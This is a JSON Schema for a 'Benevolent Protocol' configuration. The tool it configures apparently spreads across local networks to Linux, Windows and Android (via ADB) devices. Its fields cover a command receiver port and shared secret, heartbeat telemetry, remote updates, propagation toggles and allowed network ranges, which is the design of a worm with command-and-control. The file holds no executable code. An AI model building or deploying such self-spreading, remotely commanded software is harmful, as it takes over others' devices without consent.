{
    "$schema": "http://json-schema.org/draft-07/schema#",
    "title": "Benevolent Protocol Configuration",
    "type": "object",
    "properties": {
        "telemetry_enabled": {
            "type": "boolean",
            "default": true,
            "description": "Enable anonymous telemetry reporting"
        },
        "telemetry_level": {
            "type": "string",
            "enum": ["minimal", "standard", "detailed"],
            "default": "standard",
            "description": "Level of detail in telemetry reports"
        },
        "telemetry_endpoint": {
            "type": ["string", "null"],
            "default": null,
            "description": "URL for telemetry and heartbeat endpoint"
        },
        "heartbeat_interval": {
            "type": "integer",
            "default": 60,
            "minimum": 10,
            "maximum": 3600,
            "description": "Seconds between heartbeat signals"
        },
        "command_port": {
            "type": "integer",
            "default": 9527,
            "description": "Port for command receiver"
        },
        "optimization_interval": {
            "type": "integer",
            "default": 3600,
            "description": "Seconds between optimization cycles"
        },
        "propagation_enabled": {
            "type": "boolean",
            "default": false,
            "description": "Enable network propagation"
        },
        "gaming_mode_auto_detect": {
            "type": "boolean",
            "default": true,
            "description": "Automatically detect gaming and reduce impact"
        },
        "max_cpu_percent": {
            "type": "integer",
            "default": 30,
            "minimum": 5,
            "maximum": 100,
            "description": "Maximum CPU usage percentage"
        },
        "max_memory_mb": {
            "type": "integer",
            "default": 500,
            "minimum": 100,
            "maximum": 4096,
            "description": "Maximum memory usage in MB"
        },
        "control_secret": {
            "type": "string",
            "default": "change_this_secret",
            "description": "Secret key for command authentication"
        },
        "update_endpoint": {
            "type": ["string", "null"],
            "default": null,
            "description": "URL for protocol updates"
        },
        "log_level": {
            "type": "string",
            "enum": ["DEBUG", "INFO", "WARNING", "ERROR"],
            "default": "INFO",
            "description": "Logging level"
        },
        "log_file": {
            "type": ["string", "null"],
            "default": "/var/log/benevolent_protocol.log",
            "description": "Path to log file"
        },
        "platform_mode": {
            "type": "string",
            "enum": ["auto", "carrier", "active"],
            "default": "auto",
            "description": "Platform behavior mode"
        },
        "linux_carrier_mode": {
            "type": "boolean",
            "default": true,
            "description": "Spread only on Linux, no modifications"
        },
        "windows_active_mode": {
            "type": "boolean",
            "default": true,
            "description": "Optimize and spread on Windows"
        },
        "android_active_mode": {
            "type": "boolean",
            "default": true,
            "description": "Optimize Android devices via ADB"
        },
        "allowed_networks": {
            "type": "array",
            "items": {
                "type": "string"
            },
            "default": ["192.168.0.0/16", "10.0.0.0/8"],
            "description": "Networks allowed for propagation"
        },
        "excluded_hosts": {
            "type": "array",
            "items": {
                "type": "string"
            },
            "default": [],
            "description": "Hosts to exclude from propagation"
        }
    },
    "required": ["control_secret"]
}
